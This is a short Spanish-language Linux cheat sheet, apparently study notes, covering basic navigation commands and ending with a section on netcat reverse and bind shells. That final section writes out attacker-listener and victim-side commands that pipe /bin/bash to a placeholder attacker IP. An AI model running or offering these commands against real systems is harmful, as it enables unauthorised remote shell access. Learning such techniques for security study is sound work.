# Introduction to Linux ❮❯

❯ **Ctrl + l** Limpiamos la pantalla en la consola Linux (l=ele)

❯ **sudo su -** Para ser root
❯ **su root** Para cambiar de usuario y convertirnos en root

❯ **pwd** 'Print Work Directory' nos muestra la ruta actual de trabajo
❯ **cd** 'Change Directory' cambiamos de directorio con una ruta 
	❯ **cd ..** Regresamos un directorio
	❯ **cd home** Podemos ir al directorio home, si en el folder ya se encuentra el folder no es necesario poner un /
	❯ **cd /home/user/downloads** Podemos ir a un folder especifico con la ruta absoluta
❯ **ls** Podemos ver el contenido de un folder
	❯ **ls -la** Podemos ver el contenido de un folder, ademas de archivos ocultos
❯ **mkdir Dir1** Podemos crear un directorio, en este caso llamado Dir1
❯ **rmdir Dir1** Podemos eliminar el folder creado 

Rever Shell
❯ **nc -nlvp 443** Maquina atacante para recibir la ReverShell de Netcat 'Listening'
❯ **nc ❮IP❯ 443 -e /bin/bash** Maquina victima para mandar la RecerShell 'Connecting'
- IP -> De la maquina de atacante su IP

Bind Shell
❯ **nc ❮IP❯ 443** Maquina atacante 'Connecting'
* IP -> Es la IP de la maquina victima
❯ **nc -nlvp 443 -e /bin/bash** Maquina victima 'Listening'